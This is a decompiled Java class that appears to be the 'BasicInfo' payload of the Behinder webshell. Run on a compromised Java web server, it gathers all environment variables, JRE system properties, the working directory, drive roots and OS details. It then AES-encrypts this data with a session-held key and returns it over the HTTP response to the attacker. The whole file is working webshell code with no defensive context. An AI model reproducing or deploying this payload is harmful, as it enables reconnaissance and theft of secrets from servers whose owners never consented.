// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import java.util.Set;
import java.util.Properties;
import java.util.Iterator;
import java.util.HashMap;
import java.io.File;
import java.util.Map;
import javax.servlet.jsp.PageContext;

public class BasicInfo
{
    public static String whatever;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        page.getResponse().setCharacterEncoding("UTF-8");
        String result = "";
        try {
            final StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>\u73af\u5883\u53d8\u91cf:</font><br/>");
            final Map<String, String> env = System.getenv();
            for (final String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE\u7cfb\u7edf\u5c5e\u6027:</font><br/>");
            final Properties props = System.getProperties();
            final Set<Map.Entry<Object, Object>> entrySet = props.entrySet();
            for (final Map.Entry<Object, Object> entry : entrySet) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            final String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            final File[] listRoots;
            final File[] roots = listRoots = File.listRoots();
            for (final File f : listRoots) {
                driveList = driveList + f.getPath() + ";";
            }
            final String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
            final Map<String, String> entity = new HashMap<String, String>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", osInfo);
            result = this.buildJson(entity, true);
            final String key = page.getSession().getAttribute("u").toString();
            final ServletOutputStream so = page.getResponse().getOutputStream();
            so.write(Encrypt(result.getBytes(), key));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    public static byte[] Encrypt(final byte[] bs, final String key) throws Exception {
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
